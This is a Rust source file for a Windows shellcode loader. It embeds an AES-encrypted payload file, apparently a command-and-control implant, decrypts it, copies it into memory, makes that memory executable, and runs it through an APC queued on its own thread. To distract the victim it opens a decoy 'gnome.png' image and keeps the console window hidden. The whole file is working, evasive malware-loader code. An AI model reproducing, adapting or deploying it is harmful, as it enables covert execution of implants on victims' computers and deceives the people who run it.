#![windows_subsystem = "windows"]
use libaes::Cipher;
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntpsapi::{
    NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
};
use ntapi::winapi::ctypes::c_void;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::ptr::null_mut;
use std::{env, thread};

fn main() {
    load()
}

// Create a function to execute shellcode
fn load() {

    //Set key and IV values for decryption
    let key = b"This is a key and it's 32 bytes!";
    let iv = b"This is 16 bytes!!";

    //Recreate cipher used to encrypt shellcode
    let cipher = Cipher::new_256(key);

    //Read encrypted shellcode from file. The shellcode is saved as part of the binary on compilation.
    let shellcode_file = include_bytes!("enc_demon.bin");

    //Decrypt and save usable shellcode
    let decrypted_shellcode = cipher.cbc_decrypt(iv, &shellcode_file[..]);

    unsafe {
        //Allocate stack for the shellcode
        let mut allocstart: *mut c_void = null_mut();

        let mut size: usize = decrypted_shellcode.len();

        NtAllocateVirtualMemory(
            NtCurrentProcess,
            &mut allocstart,
            0,
            &mut size,
            0x3000,
            0x04, //PAGE_READWRITE
        );

        //Write shellcode to allocated memory space
        NtWriteVirtualMemory(
            NtCurrentProcess,
            allocstart,
            decrypted_shellcode.as_ptr() as _,
            decrypted_shellcode.len() as usize,
            null_mut(),
        );

        //Change memory protection to allow execution
        let mut old_protect: u32 = 0x04;
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut allocstart,
            &mut size,
            0x40, //PAGE_EXECUTE_READWRITE
            &mut old_protect,
        );

        //Queue up thread with shellcode pointer to execute
        NtQueueApcThread(
            NtCurrentThread,
            Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,
            allocstart,
            null_mut(),
            null_mut(),
        );

        //Spawn distraction image in different thread.
        thread::spawn(move || {
            pop_image();
        });

        //Execute queued threads
        NtTestAlert();
    };
}

fn pop_image() {
    //Pop gnome.png
    let image_path = format!(
        "{}/gnome.png",
        env::current_dir().unwrap().to_str().unwrap()
    );
    Command::new("cmd")
        .args(&["/C", "start", image_path.as_str()])
        .creation_flags(0x00000008) //0x0000008 DETACHED_PROCESS. Ensures cmd window doesn't pop
        .spawn()
        .expect("Failed to execute process");
}
